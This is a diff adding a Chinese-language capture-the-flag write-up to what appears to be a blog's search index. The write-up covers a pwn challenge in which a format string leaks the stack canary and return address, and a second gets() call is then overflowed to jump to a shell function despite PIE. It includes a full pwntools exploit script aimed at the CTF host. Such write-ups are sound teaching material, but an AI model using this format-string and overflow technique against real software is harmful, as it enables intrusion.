@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>分析</title>
+      <link href="/2025/02/07/%E5%88%86%E6%9E%90/"/>
+      <url>/2025/02/07/%E5%88%86%E6%9E%90/</url>
+      
+        <content type="html"><![CDATA[<p><strong>checksec</strong></p><p><img src="/../imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-02-07%20113034.png" alt="屏幕截图 2025-02-07 113034"></p><p>可以发现保护全开，拖入IDA中进行分析</p><p><img src="/../imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-02-07%20113001.png" alt="屏幕截图 2025-02-07 113001"></p><p>其他函数并不存在什么问题，此函数中存在问题，开了canary保护，变量v3即为我们需要绕过的Canary保护，栈溢出时，要还原canary，开了PIE，地址会改变。我们可以通过第一个<code>gets(format)</code>然后格式化字符串输出来泄露canary和此时函数的返回地址。然后通过第二个<code>gets(v2)</code>来进行溢出。</p><p>在printf和gets处打断点</p><p><img src="/../imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-02-07%20110606.png" alt="屏幕截图 2025-02-07 110606"></p><p>由于是64位，所以会有6个寄存器，可以看到，Canary被存在了ebp的前一个字（8个字节），所以从栈底到Canary有(0x60-0x8)/8个字，即第11个字，算上6个参数在寄存器中，Canary会被默认当作第11+6=17个参数。同理，return_addr被放在ebp后面，是第17+2=19个参数。</p><p><img src="/../imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-02-07%20112504.png" alt="屏幕截图 2025-02-07 112504"></p><p><img src="/../imgs/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-02-07%20111028.png" alt="屏幕截图 2025-02-07 111028"></p><p>可以看到在IDA中返回函数的地址及shell的地址，根据泄漏的真实地址计算出其偏移，就可以得到shell的真实地址,并根据gets(v2)构造payload。</p><p><strong>Exp</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os='linux', arch='amd64', log_level='debug')</span><br><span class="line">r = remote('node4.anna.nssctf.cn',28882)</span><br><span class="line">#r = process('./find_flag')</span><br><span class="line">payload = '%17$p'+'%19$p'</span><br><span class="line">r.sendlineafter('name? ',payload)</span><br><span class="line">r.recvuntil('Nice to meet you, ')</span><br><span class="line">canary = int(r.recv(18),16)</span><br><span class="line">addr = int(r.recv(14).decode(),16)</span><br><span class="line">main = 0x146f</span><br><span class="line">shell = 0x1231</span><br><span class="line">offset = main-shell</span><br><span class="line">shelladdr = addr-offset</span><br><span class="line"> </span><br><span class="line">r.recvuntil('Anything else? ')</span><br><span class="line">payload = b'a'*(0x40-8)+p64(canary)+b'a'*8+p64(shelladdr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>pie保护</title>
       <link href="/2025/02/06/pie%E4%BF%9D%E6%8A%A4/"/>
       <url>/2025/02/06/pie%E4%BF%9D%E6%8A%A4/</url>
